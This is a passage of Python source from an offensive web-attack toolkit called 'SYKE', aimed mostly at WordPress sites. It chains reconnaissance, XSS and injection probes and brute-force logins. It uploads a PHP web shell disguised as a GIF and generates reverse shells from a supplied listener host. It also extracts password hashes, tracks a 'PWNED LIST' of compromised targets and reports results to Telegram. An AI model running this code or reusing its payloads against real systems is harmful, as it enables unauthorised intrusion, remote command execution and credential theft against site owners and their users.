]

def port_scan(host, ports=None, timeout=2):
    if ports is None:
        ports = COMMON_PORTS
    open_ports = {}
    def _scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            s.close()
            if result == 0:
                banner = ""
                try:
                    sb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sb.settimeout(2)
                    sb.connect((host, port))
                    sb.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner_bytes = sb.recv(256)
                    banner = banner_bytes.decode("utf-8","ignore").split("\n")[0].strip()
                    sb.close()
                except Exception:
                    pass
                with LOCK:
                    open_ports[port] = banner[:60] if banner else "open"
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=min(THREADS, 50)) as pool:
        pool.map(_scan, ports)
    return open_ports

def port_scan_fn(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return {}
    base   = normalize_base(url)
    host   = urlparse(base).hostname
    _info(f"Port Scanner → {host}  ({len(COMMON_PORTS)} ports)")
    result = port_scan(host, COMMON_PORTS, timeout=2)
    if result:
        _result_box("OPEN PORTS",[
            f"{GRN}{port}/tcp{RST}  {DIM}{banner}{RST}"
            for port, banner in sorted(result.items())
        ])
        _found_box("PORT SCAN", host,
                   "\n".join(f"{p}/tcp" for p in sorted(result.keys())[:15]),
                   found=True)
    else:
        _clean("No open ports found")
        _found_box("PORT SCAN", host, "No open ports found", found=False)
    _pause()
    return result


                                                                                 
                    
                                                                                 

def subdomain_scan(domain):
    results = []
    def _resolve(sub):
        fqdn = f"{sub}.{domain}"
        try:
            addr = socket.gethostbyname(fqdn)
            results.append({"sub": sub, "fqdn": fqdn, "ip": addr})
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=min(THREADS, 50)) as pool:
        pool.map(_resolve, SUBDOMAIN_WORDLIST)
    return results

def subdomain_scan_fn(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base   = normalize_base(url)
    host   = urlparse(base).hostname
    parts  = host.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else host
    _info(f"Subdomain Scanner → {domain}  ({len(SUBDOMAIN_WORDLIST)} words)")
    results = subdomain_scan(domain)
    if results:
        _result_box("SUBDOMAINS FOUND",[
            f"{GRN}{r['fqdn']}{RST}  {DIM}{r['ip']}{RST}"
            for r in results[:30]
        ])
        _found_box("SUBDOMAIN ENUM", domain,
                   "\n".join(r['fqdn'] for r in results[:10]), found=True)
    else:
        _clean("No subdomains found")
        _found_box("SUBDOMAIN ENUM", domain,
                   "No subdomains found", found=False)
    _pause()
    return results


                                                                                 
            
                                                                                 

def dns_recon(domain):
    results = {}
    record_types = ["A","AAAA","MX","NS","TXT","CNAME","SOA","SRV","PTR"]
    for rtype in record_types:
        try:
            import subprocess
            out = subprocess.check_output(
                ["nslookup", f"-type={rtype}", domain],
                timeout=5, stderr=subprocess.DEVNULL
            ).decode("utf-8","ignore")
            if out and domain.lower() in out.lower():
                results[rtype] = [
                    line.strip()
                    for line in out.split("\n")
                    if line.strip() and not line.startswith("Server")
                    and not line.startswith("Address")
                ][:5]
        except Exception:
            try:
                addr = socket.getaddrinfo(domain, None)
                if addr:
                    results["A"] = list({a[4][0] for a in addr})[:5]
            except Exception:
                pass
    return results

def dns_recon_fn(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return {}
    base   = normalize_base(url)
    host   = urlparse(base).hostname
    parts  = host.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else host
    _info(f"DNS Recon → {domain}")
    result = dns_recon(domain)
    lines  = []
    for rtype, records in result.items():
        for rec in (records or [])[:3]:
            lines.append(f"{CYN}{rtype}{RST}  {rec}")
    if lines:
        _result_box("DNS RECORDS", lines)
        _found_box("DNS RECON", domain,
                   "\n".join(lines[:8]), found=True)
    else:
        _clean("No DNS records found")
        _found_box("DNS RECON", domain, "No DNS records found", found=False)
    _pause()
    return result


                                                                                 
                    
                                                                                 

def reverse_ip_lookup(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base = normalize_base(url)
    host = urlparse(base).hostname
    _info(f"Reverse IP Lookup → {host}")
    try:
        ip = socket.gethostbyname(host)
        _found(f"IP: {ip}")
        api_urls = [
            f"https://api.hackertarget.com/reverseiplookup/?q={ip}",
            f"https://api.hackertarget.com/hostsearch/?q={host}",
        ]
        domains = []
        for api_url in api_urls:
            try:
                r = _get(api_url)
                if r and r.ok:
                    for line in r.text.split("\n"):
                        line = line.strip()
                        if line and "." in line:
                            domains.append(line)
            except Exception:
                pass
        if domains:
            _result_box("REVERSE IP RESULTS",[
                f"{GRN}{d}{RST}" for d in domains[:30]
            ])
            _found_box("REVERSE IP", host,
                       f"IP: {ip}\n" + "\n".join(domains[:10]), found=True)
        else:
            _result_box("REVERSE IP",[
                f"{GRN}IP: {ip}{RST}",
                f"{DIM}No co-hosted domains found via API{RST}",
            ])
    except Exception as e:
        _err(f"Reverse IP error: {e}")
    _pause()
    return []


                                                                                 
                                      
                                                                                 

def xss_reflect_scan():
    _banner()
    url = _ask("xss-reflect-url")
    if not url:
        return
    url  = normalize(url)
    sess = _make_waf_session()
    _info(f"XSS Reflection Scanner → {url}")
    found  = []
    params = [
        "s","q","search","query","id","name","email","input","text",
        "message","comment","keyword","title","category","tag","p",
        "page","action","view","template","path","file","content",
    ]
    for param in params:
        for payload in XSS_PAYLOADS[:10]:
            try:
                r = sess.get(f"{url}?{param}={quote(payload)}",
                             timeout=TIMEOUT, verify=VERIFY_SSL)
                if r and (payload in r.text or
                          _html_mod.unescape(payload) in r.text):
                    found.append((param, payload))
                    _vuln(f"XSS REFLECTED: {param}={payload[:40]}")
                    break
            except Exception:
                pass

    if found:
        _result_box("XSS REFLECTED FOUND",[
            f"{RED}[VULN]{RST} {param}={payload[:50]}"
            for param, payload in found[:10]
        ])
        _found_box("XSS REFLECTED", url,
                   "\n".join(f"{p}={v[:30]}" for p,v in found[:5]), found=True)
    else:
        _clean("No reflected XSS found")
        _found_box("XSS REFLECTED", url,
                   "No reflected XSS found", found=False)
    _pause()


                                                                                 
                                       
                                                                                 

def html_injection_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base     = normalize_base(url)
    _info(f"HTML Injection → {base}")
    results  = []
    payloads = [
        "<h1>INJECTED</h1>",
        "<b>syke</b>",
        "<i>test</i>",
        "<marquee>syke</marquee>",
        "<font color=red>syke</font>",
    ]
    params = ["q","search","s","name","input","text","msg","comment"]
    for param in params:
        for payload in payloads:
            try:
                r = _get(f"{base}/?{param}={quote(payload)}")
                if r and payload in r.text:
                    results.append({"param": param, "payload": payload})
                    _vuln(f"HTML injection: {param}={payload[:40]}")
                    _add_finding(
                        "LOW","HTML Injection",f"{base}/?{param}=",
                        f"HTML tag reflected unsanitized",
                        f"Payload: {payload}",
                        "Escape all HTML output.","XSS"
                    )
                    break
            except Exception:
                pass

    if results:
        _found_box("HTML INJECTION", base,
                   "\n".join(f"[HTML] {r['param']}" for r in results[:5]),
                   found=True)
    else:
        _clean("No HTML injection detected")
        _found_box("HTML INJECTION", base,
                   "No HTML injection detected", found=False)

    _result_box("HTML INJECTION",[
        f"{RED}Issues: {len(results)}{RST}" if results
        else f"{GRN}No HTML injection detected{RST}"
    ])
    _pause()
    return results

def http_param_pollution(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base     = normalize_base(url)
    _info(f"HTTP Parameter Pollution → {base}")
    results  = []
    test_cases = [
        ("?a=1&a=2",      "duplicate param"),
        ("?a[]=1&a[]=2",  "array param"),
        ("?a=1%26b=2",    "encoded ampersand"),
        ("?a=1;b=2",      "semicolon separator"),
        ("?a=1%3bb=2",    "encoded semicolon"),
        ("?%61=1",         "encoded param name"),
    ]
    for query, note in test_cases:
        try:
            r = _get(base + "/" + query)
            if r and r.status_code == 200:
                results.append({"query": query, "note": note,
                                "status": r.status_code})
                _warn(f"HPP candidate: {query}  ({note})")
        except Exception:
            pass

    _result_box("HTTP PARAM POLLUTION",[
        f"{YLW}{r['note']}: {r['query']}{RST}" for r in results[:10]
    ] or [f"{GRN}No HPP indicators found{RST}"])
    _pause()
    return results


                                                                                 
                          
                                                                                 

def deserialization_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Deserialization Scanner → {base}")
    results = []

    for payload_b64 in DESERIALIZATION_PAYLOADS:
        for endpoint in ["/api/v1/deserialize","/api/unserialize",
                         "/api/v1/object","/api/session"]:
            try:
                r = _post(
                    base + endpoint,
                    data=payload_b64,
                    headers={"Content-Type":
                             "application/x-java-serialized-object"},
                )
                if r and r.status_code not in (400, 404):
                    error_sigs = [
                        "java.io","ClassNotFoundException",
                        "ReflectionException","unserialize",
                        "POP chain","gadget",
                    ]
                    if any(s in r.text for s in error_sigs):
                        results.append({"endpoint": endpoint,
                                        "payload": payload_b64[:30]})
                        _vuln(f"Deserialization candidate: {endpoint}")
                        _add_finding(
                            "HIGH","Insecure Deserialization",
                            base+endpoint,
                            "Deserialization endpoint with error exposure",
                            payload_b64[:60],
                            "Use safe serialization. Validate input.","Deser"
                        )
            except Exception:
                pass

    if results:
        _found_box("DESERIALIZATION", base,
                   "\n".join(r['endpoint'] for r in results[:5]), found=True)
    else:
        _clean("No deserialization candidates found")
        _found_box("DESERIALIZATION", base,
                   "No deserialization candidates", found=False)

    _result_box("DESERIALIZATION",[
        f"{RED}Candidates: {len(results)}{RST}" if results
        else f"{GRN}No candidates found{RST}"
    ])
    _pause()
    return results


                                                                                 
                            
                                                                                 

def file_upload_bypass(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"File Upload Bypass → {base}")
    results = []

    upload_paths = [
        "/upload", "/upload.php", "/uploads", "/upload/",
        "/api/upload", "/api/v1/upload", "/file/upload",
        "/media/upload", "/image/upload",
    ]

    php_shell = b"<?php system($_GET['cmd']);?>"
    gif_header = b"GIF89a"

    for path in upload_paths:
        for ext in UPLOAD_EXTENSIONS_BYPASS[:10]:
            filename  = f"test{ext}"
            file_data = gif_header + php_shell
            try:
                r = requests.post(
                    base + path,
                    files={"file": (filename, file_data, "image/gif")},
                    timeout=TIMEOUT, verify=VERIFY_SSL,
                )
                if r and r.status_code in (200, 201):
                    body = r.text
                    upload_sigs = [
                        filename.split("/")[-1],
                        "success","uploaded","file saved",
                    ]
                    if any(s.lower() in body.lower() for s in upload_sigs):
                        results.append({"path": path, "ext": ext,
                                        "filename": filename})
                        _vuln(f"Upload bypass: {path}  ext={ext}")
                        _add_finding(
                            "CRITICAL","File Upload Bypass",base+path,
                            f"Uploaded {ext} file accepted",
                            f"Filename: {filename}",
                            "Validate MIME type + extension server-side.","Upload"
                        )
            except Exception:
                pass

    if results:
        _found_box("FILE UPLOAD BYPASS", base,
                   "\n".join(f"[UPLOAD] {r['ext']}" for r in results[:5]),
                   found=True)
    else:
        _clean("No upload bypass detected")
        _found_box("FILE UPLOAD BYPASS", base,
                   "No upload bypass detected", found=False)

    _result_box("UPLOAD BYPASS",[
        f"{RED}Bypasses: {len(results)}{RST}" if results
        else f"{GRN}No upload bypass detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                        
                                                                                 

def business_logic_test(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Business Logic Tester → {base}")
    results = []

    tests = [
        ("/api/checkout",   {"price": -100, "qty": 1},   "negative price"),
        ("/api/checkout",   {"price": 0.001, "qty": 1},  "zero price"),
        ("/api/cart",       {"quantity": -1},              "negative quantity"),
        ("/api/order",      {"total": 0},                  "zero total"),
        ("/api/apply",      {"coupon": "ADMIN100"},        "admin coupon"),
        ("/api/transfer",   {"amount": -500},              "negative transfer"),
        ("/api/redeem",     {"points": 999999999},         "excessive points"),
        ("/api/discount",   {"percentage": 101},           "over 100% discount"),
        ("/api/coupon",     {"code": "' OR '1'='1"},       "SQLi in coupon"),
        ("/api/upgrade",    {"plan": "enterprise"},        "plan escalation"),
    ]

    for endpoint, data, note in tests:
        try:
            r = _post(
                base + endpoint,
                json=data,
                headers={"Content-Type": "application/json"},
            )
            if r and r.status_code in (200, 201):
                sigs = [
                    "success","approved","applied","accepted",
                    "order","confirmed","granted",
                ]
                if any(s in r.text.lower() for s in sigs):
                    results.append({"endpoint": endpoint,
                                    "note": note, "data": data})
                    _vuln(f"Business logic: {endpoint}  ({note})")
                    _add_finding(
                        "HIGH","Business Logic Flaw",base+endpoint,
                        f"Accepted illogical input: {note}",
                        f"Data: {data}",
                        "Validate business rules server-side.","Logic"
                    )
        except Exception:
            pass

    if results:
        _found_box("BUSINESS LOGIC", base,
                   "\n".join(f"[LOGIC] {r['note']}"
                             for r in results[:5]), found=True)
    else:
        _clean("No business logic flaws detected")
        _found_box("BUSINESS LOGIC", base,
                   "No business logic flaws detected", found=False)

    _result_box("BUSINESS LOGIC",[
        f"{RED}Flaws: {len(results)}{RST}" if results
        else f"{GRN}No business logic flaws{RST}"
    ])
    _pause()
    return results


                                                                                 
                                                
                                                                                 

def devtools_exposure_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"DevTools Exposure → {base}")
    results = []

    devtools_paths = {
        "/jenkins":                   ("Jenkins",   ["Jenkins", "login"]),
        "/jenkins/script":            ("Jenkins Groovy",["script"]),
        "/solr/admin":                ("Apache Solr",["solr","lucene"]),
        "/solr/":                     ("Apache Solr",["solr"]),
        "/kibana":                    ("Kibana",     ["kibana","elastic"]),
        "/kibana/app/kibana":         ("Kibana",     ["kibana"]),
        "/grafana":                   ("Grafana",    ["grafana","login"]),
        "/grafana/login":             ("Grafana",    ["grafana"]),
        "/prometheus":                ("Prometheus", ["prometheus","metrics"]),
        "/prometheus/graph":          ("Prometheus", ["prometheus"]),
        "/consul/ui":                 ("Consul",     ["consul"]),
        "/portainer":                 ("Portainer",  ["portainer","docker"]),
        "/_cat/indices":              ("Elasticsearch",["index","health"]),
        "/_cluster/health":           ("Elasticsearch",["status","cluster"]),
        "/minio/login":               ("MinIO",      ["minio","object"]),
        "/rabbitmq/api":              ("RabbitMQ",   ["rabbitmq","vhosts"]),
        "/api/v1/metrics":            ("Metrics API",["metrics"]),
        "/__admin":                   ("WireMock",   ["mappings","requests"]),
    }

    for path, (service, sigs) in devtools_paths.items():
        try:
            r = _get(base + path)
            if r and r.status_code in (200, 302):
                body = r.text.lower()
                if any(sig.lower() in body for sig in sigs):
                    results.append({"service": service, "path": path,
                                    "status": r.status_code})
                    _vuln(f"{service} exposed: {path}  [{r.status_code}]")
                    _add_finding(
                        "HIGH",f"{service} Exposed",base+path,
                        f"{service} admin interface publicly accessible",
                        f"HTTP {r.status_code}",
                        "Restrict admin tools to internal network.","Exposure"
                    )
        except Exception:
            pass

    if results:
        _found_box("DEVTOOLS EXPOSURE", base,
                   "\n".join(f"[{r['service']}] {r['path']}"
                             for r in results[:10]), found=True)
    else:
        _clean("No exposed devtools found")
        _found_box("DEVTOOLS EXPOSURE", base,
                   "No devtools exposure detected", found=False)

    _result_box("DEVTOOLS EXPOSURE",[
        f"{RED}Exposed: {len(results)}{RST}" if results
        else f"{GRN}No devtools exposure{RST}"
    ])
    _pause()
    return results


                                                                                 
                          
                                                                                 

def revshell_generator():
    _banner()
    lhost = _ask("LHOST")
    lport = _ask("LPORT (default 4444)")
    if not lhost:
        return
    if not lport.isdigit():
        lport = "4444"
    _menu_box("REVERSE SHELL GENERATOR",[
        f"[{i+1}] {name}" for i, name in enumerate(REVSHELL_TEMPLATES)
    ] + ["[0] Back"])
    ch = _ask("shell-type")
    if ch == "0":
        return
    names = list(REVSHELL_TEMPLATES.keys())
    try:
        idx  = int(ch) - 1
        name = names[idx]
        tmpl = REVSHELL_TEMPLATES[name]
        shell = tmpl.format(lhost=lhost, lport=lport)
        _result_box(f"REVERSE SHELL — {name.upper()}",[
            f"{GRN}{shell}{RST}"
        ])
        b64 = base64.b64encode(shell.encode()).decode()
        print(f"\n  {DIM}base64:{RST} {b64[:80]}...\n")
    except (IndexError, ValueError):
        _err("Invalid choice")
    _pause()


                                                                                 
                    
                                                                                 

def generate_report(target, output_html="report.html"):
    try:
        html = (
            "<!DOCTYPE html><html><head>"
            "<title>SYKE Report</title>"
            "<style>body{background:#0d0d1a;color:#c8a2ff;font-family:monospace}"
            "h1{color:#9f7aea} h2{color:#7b61ff} "
            ".crit{color:#ff4444} .high{color:#ff8800}"
            ".med{color:#00ccff} .low{color:#7744ff}"
            ".info{color:#888} table{width:100%;border-collapse:collapse}"
            "td,th{border:1px solid #333;padding:6px 10px}"
            "th{background:#1a1a2e;color:#9f7aea}"
            "</style></head><body>"
            f"<h1>SYKE Security Report</h1>"
            f"<p>Target: <b>{target or 'multiple'}</b></p>"
            f"<p>Generated: {datetime.datetime.utcnow().isoformat()}</p>"
            f"<p>User: {CURRENT_USER or 'unknown'}</p>"
            "<h2>Statistics</h2>"
            "<table><tr><th>Severity</th><th>Count</th></tr>"
        )
        for sev, key in [
            ("CRITICAL","crit"),("HIGH","hi"),("MEDIUM","med"),
            ("LOW","lo"),("INFO","info"),
        ]:
            cls = sev.lower()[:4] if sev != "MEDIUM" else "med"
            html += (f"<tr><td class='{cls}'>{sev}</td>"
                     f"<td>{STATS[key]}</td></tr>")
        html += (
            "</table><h2>Findings</h2><table>"
            "<tr><th>Severity</th><th>Title</th><th>Target</th>"
            "<th>Description</th><th>Evidence</th><th>Fix</th></tr>"
        )
        for f in FINDINGS:
            cls = (f["sev"].lower()[:4]
                   if f["sev"] != "MEDIUM" else "med")
            html += (
                f"<tr>"
                f"<td class='{cls}'>{f['sev']}</td>"
                f"<td>{_html_escape(f['title'])}</td>"
                f"<td>{_html_escape(f['target'][:60])}</td>"
                f"<td>{_html_escape(f['desc'][:120])}</td>"
                f"<td><code>{_html_escape(f['evid'][:80])}</code></td>"
                f"<td>{_html_escape(f['fix'][:100])}</td>"
                f"</tr>"
            )
        html += "</table></body></html>"
        os.makedirs(OUT_DIR, exist_ok=True)
        fpath = os.path.join(OUT_DIR, output_html)
        with open(fpath, "w", encoding="utf-8") as fh:
            fh.write(html)
        _clean(f"HTML report: {fpath}")
        return fpath
    except Exception as e:
        _err(f"Report error: {e}")
        return None

def _export_results_formats():
    os.makedirs(OUT_DIR, exist_ok=True)
    try:
        with open(os.path.join(OUT_DIR, OUTPUT_JSON), "w",
                  encoding="utf-8") as f:
            json.dump({
                "stats":    STATS,
                "findings": FINDINGS,
                "pwned":    PWNED_LIST,
                "ts":       datetime.datetime.utcnow().isoformat(),
                "user":     CURRENT_USER,
            }, f, indent=2, ensure_ascii=False)
        _clean(f"JSON: {OUTPUT_JSON}")
    except Exception as e:
        _err(f"JSON export error: {e}")

    csv_file = os.path.join(OUT_DIR, f"findings_{SID}.csv")
    try:
        with open(csv_file, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=[
                "sev","title","target","desc","evid","fix","cat","ts"
            ])
            w.writeheader()
            w.writerows(FINDINGS)
        _clean(f"CSV: {csv_file}")
    except Exception as e:
        _err(f"CSV export error: {e}")

def _display_pwned_list():
    _banner()
    if not PWNED_LIST:
        _result_box("PWNED LIST",[f"{DIM}No compromised targets yet{RST}"])
        return
    _result_box("PWNED LIST",[
        f"{RED}{line}{RST}" for line in PWNED_LIST[:50]
    ])

def _display_findings_summary():
    _banner()
    if not FINDINGS:
        _result_box("FINDINGS",[f"{DIM}No findings recorded yet{RST}"])
        return
    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sorted_f  = sorted(FINDINGS, key=lambda x: sev_order.get(x["sev"],5))
    cols      = CVE_SEVERITY_COLORS
    _result_box("ALL FINDINGS",[
        f"{cols.get(f['sev'],RST)}[{f['sev'][:4]}]{RST} "
        f"{f['title'][:40]}  {DIM}{f['target'][:40]}{RST}"
        for f in sorted_f[:50]
    ])


                                                                                 
            
                                                                                 

def full_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return {}
    base = normalize_base(url)
    _info(f"FULL SCAN → {base}")
    sess = _make_waf_session()
    scan_results = {"target": base}

    print(BLU +
          "\n  ╔════════════════════════════════════════╗\n"
          "  ║  Phase 1 — Fingerprint & Recon        ║\n"
          "  ╚════════════════════════════════════════╝" + RST)
    scan_results["fingerprint"] = fingerprint_wp(sess, base, TIMEOUT)
    scan_results["waf"]         = detect_waf(sess, base, TIMEOUT)
    scan_results["headers"]     = headers_enumeration(sess, base, TIMEOUT)
    scan_results["version"]     = wp_version_check_vuln(sess, base, TIMEOUT)

    print(BLU +
          "\n  ╔════════════════════════════════════════╗\n"
          "  ║  Phase 2 — Enumeration                ║\n"
          "  ╚════════════════════════════════════════╝" + RST)
    scan_results["users"]   = enumerate_users(sess, base, TIMEOUT)
    scan_results["plugins"] = enumerate_plugins(sess, base, TIMEOUT)
    scan_results["themes"]  = enumerate_themes(sess, base, TIMEOUT)
    scan_results["xmlrpc"]  = xmlrpc_probe(sess, base, TIMEOUT)

    print(BLU +
          "\n  ╔════════════════════════════════════════╗\n"
          "  ║  Phase 3 — Vulnerability Scan         ║\n"
          "  ╚════════════════════════════════════════╝" + RST)
    scan_results["sqli"]         = sqli_probe(sess, base, TIMEOUT)
    scan_results["union_sqli"]   = sql_union_probe(sess, base, TIMEOUT)
    scan_results["lfi"]          = lfi_probe(sess, base, TIMEOUT)
    scan_results["ssrf"]         = ssrf_probe(sess, base, TIMEOUT)
    scan_results["nosql"]        = nosql_injection_probe(sess, base, TIMEOUT)
    scan_results["ssti"]         = ssti_probe(sess, base, TIMEOUT)
    scan_results["xss"]          = xss_probe(sess, base, TIMEOUT)
    scan_results["cmd_inject"]   = cmd_injection_probe(sess, base, TIMEOUT)
    scan_results["open_redirect"]= open_redirect_probe(sess, base, TIMEOUT)
    scan_results["session"]      = session_fixation_check(sess, base, TIMEOUT)
    scan_results["file_write"]   = file_write_probe(sess, base, TIMEOUT)
    scan_results["emails"]       = extract_emails(sess, base, TIMEOUT)
    scan_results["debug"]        = check_debug_mode(sess, base, TIMEOUT)

    print(BLU +
          "\n  ╔════════════════════════════════════════╗\n"
          "  ║  Phase 4 — Network Recon              ║\n"
          "  ╚════════════════════════════════════════╝" + RST)
    parsed_host = urlparse(base).hostname
    if parsed_host:
        parts  = parsed_host.split(".")
        domain = ".".join(parts[-2:]) if len(parts) >= 2 else parsed_host
        scan_results["port_scan"]  = port_scan(parsed_host, timeout=2)
        scan_results["subdomains"] = subdomain_scan(domain)
        scan_results["dns"]        = dns_recon(domain)
        scan_results["ssl"]        = ssl_info_probe(base, 5)

    generate_summary_report(base, scan_results)

    rfile = ("full_scan_" +
             re.sub(r'[^a-zA-Z0-9]','_',urlparse(base).netloc)[:30] +
             ".json")
    os.makedirs(OUT_DIR, exist_ok=True)
    try:
        with open(os.path.join(OUT_DIR, rfile), "w", encoding="utf-8") as fh:
            json.dump(scan_results, fh, indent=2, ensure_ascii=False,
                      default=str)
        _info(f"Full scan saved: {rfile}")
    except Exception as e:
        _err(f"Save error: {e}")

    html_out = ("report_" +
                re.sub(r'[^a-zA-Z0-9]','_',urlparse(base).netloc)[:30] +
                ".html")
    generate_report(base, output_html=html_out)

    n_vulns = sum([
        len(scan_results.get("sqli",[])),
        len(scan_results.get("lfi",[])),
        len(scan_results.get("ssrf",[])),
        len(scan_results.get("xss",[])),
        len(scan_results.get("ssti",[])),
        len(scan_results.get("nosql",[])),
    ])

    _result_box("FULL SCAN COMPLETE",[
        f"{GRN}Target:{RST} {base}",
        f"{GRN}Users:{RST} {len(scan_results.get('users',[]))}",
        f"{GRN}Plugins:{RST} {len(scan_results.get('plugins',[]))}",
        f"{RED}Vulnerabilities:{RST} {n_vulns}",
        f"{GRN}Open Ports:{RST} {len(scan_results.get('port_scan',{}))}",
        f"{GRN}HTML Report:{RST} {html_out}",
    ])

    _tg_send_result(
        "FULL SCAN COMPLETE", base,
        f"Vulns: {n_vulns}  Users: {len(scan_results.get('users',[]))}  "
        f"Plugins: {len(scan_results.get('plugins',[]))}",
        CURRENT_USER,
    )

    _pause()
    return scan_results

def batch_scan(targets_file):
    _banner()
    targets = _load_targets(targets_file)
    if not targets:
        _err(f"No targets in {targets_file}")
        _pause()
        return
    _info(f"Batch scan: {len(targets)} targets")
    results = []
    for t in targets:
        _info(f"Scanning: {t}")
        r = full_scan(t)
        results.append(r)
    _result_box("BATCH COMPLETE",[
        f"{GRN}Targets scanned: {len(results)}{RST}"
    ])
    _pause()
    return results

def wp_full_audit(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return {}
    base = normalize_base(url)
    _info(f"WP Full Audit → {base}")
    sess   = _make_waf_session()
    result = {}
    result["version"]    = wp_version_check_vuln(sess, base, TIMEOUT)
    result["users"]      = enumerate_users(sess, base, TIMEOUT)
    result["plugins"]    = enumerate_plugins(sess, base, TIMEOUT)
    result["themes"]     = enumerate_themes(sess, base, TIMEOUT)
    result["xmlrpc"]     = xmlrpc_probe(sess, base, TIMEOUT)
    result["backup"]     = backup_finder(sess, base, TIMEOUT)
    result["admin"]      = admin_panel_scan(sess, base, TIMEOUT)
    result["sqli"]       = sqli_probe(sess, base, TIMEOUT)
    result["lfi"]        = lfi_probe(sess, base, TIMEOUT)
    result["xss"]        = xss_probe(sess, base, TIMEOUT)
    result["secrets"]    = find_exposed_secrets(sess, base, TIMEOUT)
    result["headers"]    = check_http_security_headers(sess, base, TIMEOUT)
    result["cookies"]    = check_cookie_security(sess, base, TIMEOUT)
    result["debug"]      = check_debug_mode(sess, base, TIMEOUT)
    result["mu_plugins"] = check_mu_plugins(sess, base, TIMEOUT)
    result["waf"]        = detect_waf(sess, base, TIMEOUT)
    plugin_vulns = check_all_plugin_vulns(
        sess, base, result["plugins"], TIMEOUT)
    result["plugin_vulns"] = plugin_vulns
    n = sum([len(result.get("sqli",[])),len(result.get("lfi",[])),
             len(result.get("xss",[])),len(plugin_vulns)])
    _result_box("WP AUDIT COMPLETE",[
        f"{GRN}Version:{RST} {result['version'].get('version','?')}",
        f"{GRN}Users:{RST} {len(result.get('users',[]))}",
        f"{GRN}Plugins:{RST} {len(result.get('plugins',[]))}",
        f"{RED}Vulns:{RST} {n}",
        f"{RED}Plugin CVEs:{RST} {len(plugin_vulns)}",
    ])
    _pause()
    return result


                                                                                 
                              
                                                                                 

def run_exploit_chain_preset(sess, base, preset_name, lhost=None,
                              lport=None, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    steps   = EXPLOIT_CHAIN_PRESETS.get(preset_name, [])
    results = {}
    _log("info", f"Preset chain: {preset_name} ({len(steps)} steps)")
    for step in steps:
        try:
            if step == "fingerprint":
                results["fingerprint"] = fingerprint_wp(sess, base,
                                                         timeout=timeout)
            elif step == "user_enum":
                results["users"] = enumerate_users(sess, base, timeout)
            elif step == "plugin_enum":
                results["plugins"] = enumerate_plugins(sess, base, timeout)
            elif step == "theme_enum":
                results["themes"] = enumerate_themes(sess, base, timeout)
            elif step == "vuln_scan":
                results["cve_results"] = run_all_cves(sess, base, timeout)
            elif step == "sqli":
                results["sqli"] = sql_union_probe(sess, base, timeout)
            elif step == "lfi":
                results["lfi"] = lfi_probe(sess, base, timeout)
            elif step == "ssrf":
                results["ssrf"] = ssrf_probe(sess, base, timeout)
            elif step == "xss":
                results["xss"] = xss_probe(sess, base, timeout)
            elif step == "ssti":
                results["ssti"] = ssti_probe(sess, base, timeout)
            elif step == "xmlrpc_brute":
                users  = results.get("users", [])
                u_list = [u["login"] for u in users if u.get("login")]
                if u_list:
                    results["xmlrpc_brute"] = xmlrpc_bruteforce(
                        sess, base, u_list[0], timeout=timeout)
            elif step == "login_brute":
                results["login_brute"] = full_login_bruteforce(
                    sess, base, timeout=timeout)
            elif step == "backup_finder":
                results["backups"] = backup_finder(sess, base, timeout)
            elif step == "secret_finder":
                results["secrets"] = find_exposed_secrets(
                    sess, base, timeout)
            elif step == "shell_upload":
                results["shell_upload"] = auto_webshell_upload(base)
            elif step == "hash_extract":
                results["hashes"] = extract_wp_hashes(sess, base)
            elif step == "waf_detect":
                results["waf"] = detect_waf(sess, base, timeout)
            elif step == "ssl_check":
                results["ssl"] = ssl_info_probe(base)
            elif step == "dns_recon":
                host = urlparse(base).hostname or base
                parts = host.split(".")
                dom   = ".".join(parts[-2:]) if len(parts) >= 2 else host
                results["dns"] = dns_recon(dom)
            elif step == "sitemap_enum":
                results["sitemap"] = sitemap_enum(sess, base, timeout)
            elif step == "dir_brute":
                results["dirs"] = directory_bruteforce(
                    sess, base, timeout=timeout)
            _log("verbose", f"  step done: {step}")
        except Exception as e:
            _log("debug", f"  step error [{step}]: {e}")
    results["_preset"] = preset_name
    return results

def exploit_chain_preset_runner():
    _banner()
    url = _ask("chain-target")
    if not url:
        return
    base = normalize(url)
    _menu_box("EXPLOIT CHAIN PRESETS",[
        "[01] quick       — user_enum + xmlrpc_brute + login_brute",
        "[02] passive     — fingerprint + enum + vuln_scan",
        "[03] aggressive  — full active exploitation",
        "[04] stealth     — low-noise fingerprint + enum",
        "[05] recon_only  — pure passive recon",
        "[06] postexploit — post-access actions",
    ])
    ch = _ask("preset-choice").strip()
    presets = {
        "1": "quick", "2": "passive", "3": "aggressive",
        "4": "stealth", "5": "recon_only", "6": "postexploit",
    }
    preset_name = presets.get(ch, "quick")
